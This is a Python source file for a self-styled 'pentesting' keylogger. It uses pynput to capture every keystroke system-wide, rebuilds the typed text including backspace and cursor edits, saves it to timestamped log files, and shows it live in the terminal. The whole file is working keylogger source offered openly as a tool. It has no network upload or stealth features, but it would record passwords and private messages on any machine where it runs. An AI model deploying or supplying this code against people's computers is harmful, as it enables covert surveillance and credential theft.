from pynput import keyboard
import os
from datetime import datetime
import pyfiglet
import time

# ASCII banner
ascii_banner = pyfiglet.figlet_format("Kyutopus \nPentesting \nKey Logger & Live Capture")
print(ascii_banner)

# Setup
output_dir = r"C:\Users\ainks\OneDrive\Desktop\py_kyutopus\cyber_tools\key_logger\captured_data"
os.makedirs(output_dir, exist_ok=True)
timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S") #take the current timestamp from the system
log_filename = f"keystrokes_{timestamp}.txt"
log_path = os.path.join(output_dir, log_filename) 

# Internal buffer and cursor
keystroke_buffer = []
cursor_pos = 0

# Keys to ignore
ignored_keys = {
    keyboard.Key.shift, 
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l, 
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l, 
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
}

def format_special_key(key):
    if key == keyboard.Key.space: return " "
    elif key == keyboard.Key.enter: return "\n"
    elif key == keyboard.Key.tab: return "\t"
    return f" [{key.name.upper()}] "

def record_key(key):
    global keystroke_buffer, cursor_pos

    if key in ignored_keys:
        return

    if key == keyboard.Key.backspace:
        if cursor_pos > 0:
            del keystroke_buffer[cursor_pos - 1]
            cursor_pos -= 1
    elif key == keyboard.Key.left:
        if cursor_pos > 0:
            cursor_pos -= 1
    elif key == keyboard.Key.right:
        if cursor_pos < len(keystroke_buffer):
            cursor_pos += 1
    elif key == keyboard.Key.home:
        cursor_pos = 0
    elif key == keyboard.Key.end:
        cursor_pos = len(keystroke_buffer)
    else:
        try:
            keystroke_buffer.insert(cursor_pos, key.char)
            cursor_pos += 1
        except AttributeError:
            special = format_special_key(key)
            if special:
                keystroke_buffer.insert(cursor_pos, special)
                cursor_pos += 1

    # Write buffer to log file
    with open(log_path, "w", encoding="utf-8") as log_file:
        log_file.write("".join(keystroke_buffer))

    # Print live text to terminal
    os.system("cls" if os.name == "nt" else "clear")
    print(ascii_banner)
    print("LIVE CAPTURE:\n")
    print("".join(keystroke_buffer))

def run_keylogger():
    print(f"Keylogger started... (Log: {log_filename}) (Press Ctrl+C to stop)")
    listener = keyboard.Listener(on_press=record_key)
    listener.start()
    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\nKeylogger stopped.")
        listener.stop()

if __name__ == "__main__":
    run_keylogger()



